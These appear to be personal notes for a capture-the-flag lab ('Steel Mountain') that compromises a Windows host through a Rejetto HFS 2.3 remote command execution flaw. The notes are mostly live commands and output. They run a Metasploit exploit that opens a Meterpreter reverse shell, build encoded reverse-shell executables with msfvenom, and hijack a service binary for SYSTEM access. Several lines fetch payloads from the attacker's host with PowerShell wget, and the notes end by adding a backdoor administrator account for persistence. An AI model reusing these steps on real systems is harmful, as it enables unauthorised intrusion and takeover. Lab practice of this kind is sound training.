@@ -1,0 +1,672 @@
+
+
+HTTP File Server (HFS)  Rejetto Vuln  //  MSF
+
+NO-MSF   //  python 
+
+powerup.ps1  //  winPEAS 
+
+AdvancedSystemCareService9
+
+
+
+
+nmap 10.10.186.204 -oN nmap0                         
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 17:15 EST
+Nmap scan report for 10.10.186.204
+Host is up (0.11s latency).
+Not shown: 988 closed ports
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+8080/tcp  open  http-proxy
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49163/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds
+
+
+
+nmap -sC -sS -sV -T4 -O -n -Pn 10.10.186.204 -oN nmap1     
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 17:14 EST
+Nmap scan report for 10.10.186.204
+Host is up (0.10s latency).
+Not shown: 988 closed ports
+PORT      STATE SERVICE            VERSION
+80/tcp    open  http               Microsoft IIS httpd 8.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: Site doesn't have a title (text/html).
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp  open  ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=steelmountain
+| Not valid before: 2020-10-11T19:04:29
+|_Not valid after:  2021-04-12T19:04:29
+|_ssl-date: 2021-02-19T22:15:58+00:00; 0s from scanner time.
+8080/tcp  open  http               HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49155/tcp open  msrpc              Microsoft Windows RPC
+49157/tcp open  msrpc              Microsoft Windows RPC
+49163/tcp open  msrpc              Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=2/19%OT=80%CT=1%CU=35577%PV=Y%DS=2%DC=I%G=Y%TM=6030389
+OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10F%TI=I%CI=I%TS=7)SEQ(SP=1
+OS:02%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M505NW8ST11%O2=M505NW8S
+OS:T11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M505NW8ST11%O6=M505ST11)WIN(W1=200
+OS:0%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M50
+OS:5NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%
+OS:W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=
+OS:)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=
+OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF
+OS:=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=
+OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:04:98:9f:bc:ed (unknown)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-02-19T22:15:51
+|_  start_date: 2021-02-19T22:10:18
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 97.12 seconds
+
+
+
+
+FROM PAGE SOURCE:
+
+<fieldset id='serverinfo'>
+		<legend><img src="/~img0"> Server information</legend>
+		<a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3</a>
+		<br />Server time: 2/19/2021 2:19:05 PM
+		<br />Server uptime: 00:08:09
+	</fieldset>
+
+
+
+
+
+
+searchsploit HFS 2.3                   
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+HFS Http File Server 2.3m Build 300 - Buffer  | multiple/remote/48569.py
+Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbi | multiple/remote/30850.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote | windows/remote/34668.txt
+Rejetto HTTP File Server (HFS) 2.3.x - Remote | windows/remote/39161.py
+Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c | windows/webapps/34852.txt
+---------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+
+
+
+
+
+
+
+Initial Access
+
+
+
+
+
+msf6 > search HFS 2.3
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
+   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/rejetto_hfs_exec
+
+msf6 > search 2014-6287
+
+Matching Modules
+================
+
+   #  Name                                   Disclosure Date  Rank       Check  Description
+   -  ----                                   ---------------  ----       -----  -----------
+   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
+
+msf6 > use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/http/rejetto_hfs_exec) > options
+
+Module options (exploit/windows/http/rejetto_hfs_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               no        Seconds to wait before terminating web server
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The path of the web application
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.9.4.45
+LHOST => 10.9.4.45
+msf6 exploit(windows/http/rejetto_hfs_exec) > run
+
+[-] Exploit failed: One or more options failed to validate: RHOSTS.
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.186.204
+RHOSTS => 10.10.186.204
+msf6 exploit(windows/http/rejetto_hfs_exec) > options
+
+Module options (exploit/windows/http/rejetto_hfs_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               no        Seconds to wait before terminating web server
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.186.204    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The path of the web application
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.9.4.45        yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
+RPORT => 8080
+msf6 exploit(windows/http/rejetto_hfs_exec) > run
+
+[*] Started reverse TCP handler on 10.9.4.45:4444 
+[*] Using URL: http://0.0.0.0:8080/WktP6qw5DcnP
+[*] Local IP: http://10.0.2.15:8080/WktP6qw5DcnP
+[*] Server started.
+[*] Sending a malicious request to /
+/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
+/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
+[*] Payload request received: /WktP6qw5DcnP
+[*] Sending stage (175174 bytes) to 10.10.186.204
+[*] Meterpreter session 1 opened (10.9.4.45:4444 -> 10.10.186.204:49218) at 2021-02-19 17:26:05 -0500
+[!] Tried to delete %TEMP%\OtDdVJfYTpvQT.vbs, unknown result
+[*] Server stopped.
+
+meterpreter > whoami
+[-] Unknown command: whoami.
+meterpreter > getuid
+Server username: STEELMOUNTAIN\bill
+meterpreter > dir
+Listing: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+====================================================================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40777/rwxrwxrwx   0       dir   2021-02-19 17:26:00 -0500  %TEMP%
+100666/rw-rw-rw-  174     fil   2019-09-27 07:07:07 -0400  desktop.ini
+100777/rwxrwxrwx  760320  fil   2019-09-27 05:24:35 -0400  hfs.exe
+
+meterpreter > pwd
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+meterpreter > cd \Users\bill
+[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
+meterpreter > pwd
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+meterpreter > cd ../../../../../../
+meterpreter > pwd
+C:\Users\bill\AppData
+meterpreter > cd ../
+meterpreter > pwd
+C:\Users\bill
+meterpreter > ls
+Listing: C:\Users\bill
+======================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+40777/rwxrwxrwx   0        dir   2019-09-27 02:29:24 -0400  .groovy
+40777/rwxrwxrwx   0        dir   2019-09-27 02:29:03 -0400  AppData
+40777/rwxrwxrwx   0        dir   2019-09-27 02:29:03 -0400  Application Data
+40555/r-xr-xr-x   0        dir   2019-09-27 07:07:07 -0400  Contacts
+40777/rwxrwxrwx   0        dir   2019-09-27 02:29:03 -0400  Cookies
+40555/r-xr-xr-x   0        dir   2019-09-27 02:29:03 -0400  Desktop
+40555/r-xr-xr-x   4096     dir   2019-09-27 02:29:03 -0400  Documents
+40555/r-xr-xr-x   0        dir   2019-09-27 02:29:03 -0400  Downloads
+40555/r-xr-xr-x   0        dir   2019-09-27 02:29:03 -0400  Favorites
+40555/r-xr-xr-x   0        dir   2019-09-27 02:29:03 -0400  Links
+40777/rwxrwxrwx   0        dir   2019-09-27 02:29:03 -0400  Local Settings
+40555/r-xr-xr-x   0        dir   2019-09-27 02:29:03 -0400  Music
+40777/rwxrwxrwx   0        dir   2019-09-27 02:29:03 -0400  My Documents
+100666/rw-rw-rw-  524288   fil   2019-09-27 02:29:03 -0400  NTUSER.DAT
+100666/rw-rw-rw-  1048576  fil   2019-09-27 12:09:04 -0400  NTUSER.DAT{3a3c0ba1-b123-11e3-80ba-a4badb27b52d}.TxR.0.regtrans-ms
+100666/rw-rw-rw-  1048576  fil   2019-09-27 12:09:05 -0400  NTUSER.DAT{3a3c0ba1-b123-11e3-80ba-a4badb27b52d}.TxR.1.regtrans-ms
+100666/rw-rw-rw-  1048576  fil   2019-09-27 12:09:05 -0400  NTUSER.DAT{3a3c0ba1-b123-11e3-80ba-a4badb27b52d}.TxR.2.regtrans-ms
+100666/rw-rw-rw-  65536    fil   2019-09-27 12:09:04 -0400  NTUSER.DAT{3a3c0ba1-b123-11e3-80ba-a4badb27b52d}.TxR.blf
+100666/rw-rw-rw-  65536    fil   2019-09-27 02:29:03 -0400  NTUSER.DAT{3a3c0ba2-b123-11e3-80ba-a4badb27b52d}.TM.blf
+100666/rw-rw-rw-  524288   fil   2019-09-27 02:29:03 -0400  NTUSER.DAT{3a3c0ba2-b123-11e3-80ba-a4badb27b52d}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288   fil   2019-09-27 02:29:03 -0400  NTUSER.DAT{3a3c0ba2-b123-11e3-80ba-a4badb27b52d}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   0        dir   2019-09-27 02:29:03 -0400  NetHood
+40555/r-xr-xr-x   0        dir   2019-09-27 02:29:03 -0400  Pictures
+40777/rwxrwxrwx   0        dir   2019-09-27 02:29:03 -0400  PrintHood
+40777/rwxrwxrwx   0        dir   2019-09-27 02:29:03 -0400  Recent
+40555/r-xr-xr-x   0        dir   2019-09-27 02:29:03 -0400  Saved Games
+40555/r-xr-xr-x   0        dir   2019-09-27 07:07:07 -0400  Searches
+40777/rwxrwxrwx   0        dir   2019-09-27 02:29:03 -0400  SendTo
+40777/rwxrwxrwx   0        dir   2019-09-27 02:29:03 -0400  Start Menu
+40777/rwxrwxrwx   0        dir   2019-09-27 02:29:03 -0400  Templates
+40555/r-xr-xr-x   0        dir   2019-09-27 02:29:03 -0400  Videos
+100666/rw-rw-rw-  454656   fil   2019-09-27 02:29:03 -0400  ntuser.dat.LOG1
+100666/rw-rw-rw-  94208    fil   2019-09-27 02:29:03 -0400  ntuser.dat.LOG2
+100666/rw-rw-rw-  20       fil   2019-09-27 02:29:03 -0400  ntuser.ini
+
+meterpreter > cd Documents
+meterpreter > ls
+Listing: C:\Users\bill\Documents
+================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   0     dir   2019-09-27 02:29:03 -0400  My Music
+40777/rwxrwxrwx   0     dir   2019-09-27 02:29:03 -0400  My Pictures
+40777/rwxrwxrwx   0     dir   2019-09-27 02:29:03 -0400  My Videos
+100666/rw-rw-rw-  402   fil   2019-09-27 07:07:07 -0400  desktop.ini
+
+meterpreter > cd ..
+meterpreter > cd Desktop
+meterpreter > ls
+Listing: C:\Users\bill\Desktop
+==============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2019-09-27 07:07:07 -0400  desktop.ini
+100666/rw-rw-rw-  70    fil   2019-09-27 08:42:38 -0400  user.txt
+
+meterpreter > cat user.txt
+��b04763b6fcf51fcd7c13abc7db4fd365
+meterpreter > 
+
+
+
+
+
+
+
+
+
+
+
+Escalating Privilages  with powerup.ps1  :
+
+
+
+curl https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -o powerup.ps1
+
+
+
+meterpreter > upload /hackme/steelmtn/powerup.ps1
+[*] uploading  : /hackme/steelmtn/powerup.ps1 -> powerup.ps1
+[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /hackme/steelmtn/powerup.ps1 -> powerup.ps1
+[*] uploaded   : /hackme/steelmtn/powerup.ps1 -> powerup.ps1
+meterpreter > 
+
+
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+PS > pwd
+
+Path
+----
+C:\Users\bill\Desktop
+
+
+PS > . .\powerup.ps1
+PS > Invoke-AllChecks
+
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
+                 Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
+                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+
+ServiceName    : AWSLiteAgent
+Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
+CanRestart     : False
+Name           : AWSLiteAgent
+Check          : Unquoted Service Paths
+
+ServiceName    : AWSLiteAgent
+Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
+CanRestart     : False
+Name           : AWSLiteAgent
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
+                 Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : IObitUnSvr
+Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
+                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
+CanRestart     : False
+Name           : IObitUnSvr
+Check          : Unquoted Service Paths
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
+CanRestart     : False
+Name           : LiveUpdateSvc
+Check          : Unquoted Service Paths
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
+CanRestart     : False
+Name           : LiveUpdateSvc
+Check          : Unquoted Service Paths
+
+ServiceName    : LiveUpdateSvc
+Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
+                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
+CanRestart     : False
+Name           : LiveUpdateSvc
+Check          : Unquoted Service Paths
+
+ServiceName                     : AdvancedSystemCareService9
+Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
+CanRestart                      : True
+Name                            : AdvancedSystemCareService9
+Check                           : Modifiable Service Files
+
+ServiceName                     : IObitUnSvr
+Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
+CanRestart                      : False
+Name                            : IObitUnSvr
+Check                           : Modifiable Service Files
+
+ServiceName                     : LiveUpdateSvc
+Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
+ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
+ModifiableFileIdentityReference : STEELMOUNTAIN\bill
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
+CanRestart                      : False
+Name                            : LiveUpdateSvc
+Check                           : Modifiable Service Files
+
+
+
+PS > 
+
+
+
+we find 
+
+
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths          **************HERE IS WHAT WE WANT******************
+
+
+
+
+
+msfvenom to generate shell
+
+(root💀kali)-[/hackme/steelmtn]
+└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.4.45 LPORT=53 -e x86/shikata_ga_nai -f exe -o Advanced.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 487 (iteration=0)
+x86/shikata_ga_nai chosen with final size 487
+Payload size: 487 bytes
+Final size of exe file: 7168 bytes
+Saved as: Advanced.exe
+
+mistakeeeee
+
+needs to be saved as ASCService.exe
+
+
+now, control c to back up PS>
+upload ASCService.exe
+
+
+meterpreter > upload ASCService.exe
+[*] uploading  : /hackme/steelmtn/ASCService.exe -> ASCService.exe
+[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%): /hackme/steelmtn/ASCService.exe -> ASCService.exe
+[*] uploaded   : /hackme/steelmtn/ASCService.exe -> ASCService.exe
+meterpreter > 
+
+FOREEEEEVER,,, this sucks, samething happened first time,,, locations matter, 
+
+like four hours and nothing ASCService has no Care for me,,, kind of not a good way to go, 
+
+cool how the mayor does everything in metasploit, good practise ,,, and also upload the file on the directory instead of the copy bullcrap
+
+https://www.cybersecpadawan.com/2020/04/tryhackme-steel-mountain-metasploit-and.html
+
+
+
+
+
+
+so without metasploit,,, 
+
+nc.exe, 39161.py, 
+
+put listner ip on python file,
+
+we need three consoles, 
+
+1-   nc -lvnp <port>
+2-  python -m simpleHTTPServer 80
+3-  python 39161.py <ip> <port>
+
+you should see the python file hitting the server, and then get a connection on nc
+
+
+we upload our winpeas with powershell,,,
+
+
+powershell -c wget "http://10.9.4.45:80/winPEASx64.exe" -outfile "winpeas.exe"
+
+OR
+
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """
+
+will do the same thing with no uploading,,,,
+
+move directories!!!!!!
+
+sc qc AdvancedSystemCareService9 (note you have to run this from the above directory)
+
+
+ icacls "Advanced SystemCare" (note RX,W notates Read, Execute, and Write permissions)
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.1.198 LPORT=5555 -f exe -o /root/Desktop/Advanced.exe
+
+powershell -c wget "http://10.11.1.198/Advanced.exe" -outfile Advanced.exe
+
+sc stop AdvancedSystemCareService9 followed by sc start AdvancedSystemCareService9
+
+
+
+
+
+PERSISTANCE
+
+
+net user themayor !Password!123 /add
+
+net localgroup "Administrators" themayor /add
+
+net localgroup "Administrators" 
+
+
+
+
+
+xfreerdp /u:themayor /p:'!Password!123' /v:10.10.220.194
